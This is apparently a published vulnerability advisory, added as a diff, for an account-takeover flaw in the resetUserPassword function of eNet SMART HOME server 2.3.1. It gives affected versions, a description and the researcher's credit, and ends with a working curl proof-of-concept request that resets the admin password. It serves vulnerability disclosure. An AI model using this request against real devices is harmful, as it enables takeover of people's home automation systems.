@@ -1,0 +1,52 @@
+
+eNet SMART HOME server 2.3.1 (resetUserPassword) Account Takeover
+
+
+Vendor: Gira Giersiepen GmbH & Co. KG | ALBRECHT JUNG GmbH & Co. KG | Insta GmbH
+Product web page: https://www.enet-smarthome.com
+Affected version: 2.3.1 (46841)
+                  2.2.1 (46056)
+
+Summary: Two German specialists in building systems technology are jointly bringing
+a new, wireless-based smart home system to the market. Gira and JUNG are the companies
+behind the eNet SMART HOME brand with our subsidiary, INSTA, responsible for developing
+the system. All three of us are old hands when it comes to building automation, and
+have a history of connecting buildings in an intelligent way that goes back as far as
+the 80s. Gira, JUNG and INSTA were part of the group of companies that initiated and
+founded EIBA (now known as KNX). KNX is the first open global standard for home and
+building automation. Through KNX, we have decisively shaped the development of intelligent
+building systems technology – and this wealth of experience has now come together in
+eNet SMART HOME. The eNet server is the heart of every eNet SMART HOME system and
+offers end customers the basis for an easy-to-use and secure Smart Home and installation
+engineers easily understandable and professional commissioning of the system.
+
+Desc: The eNet Smart Home system contains an authorization flaw in the resetUserPassword
+functionality that allows any authenticated low-privileged user (UG_USER) to reset the
+password of arbitrary accounts, including those in the UG_ADMIN and UG_SUPER_ADMIN groups,
+without supplying the current password or having sufficient privileges. By sending a crafted
+JSON-RPC request, an attacker can overwrite existing credentials. This is a a direct account
+takeover via improper authorization, resulting in full administrative access and persistent
+privilege escalation.
+
+Tested on: GNU/Linux 4.4.15 (ARMv7 revision 5)
+           Jetty(9.2.z-SNAPSHOT)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5974
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5974.php
+
+
+07.02.2026
+
+--
+
+
+$ curl -X POST "http://TARGETIP:8080/jsonrpc/management" \
+ -H "Content-Type: application/json" \
+ -H "Referer: http://TARGETIP:8080/serverconfiguration.html?icp=99e5DE8sJ81b2yR3NAB0" \
+ -H "Cookie: INSTASESSIONID=2txt9zmzo8ij3cfdyagulvb7s" \
+ --data '{"jsonrpc":"2.0","method":"resetUserPassword","params":{"userName":"admin","defaultPassword":"12345678"},"id":"15"}'
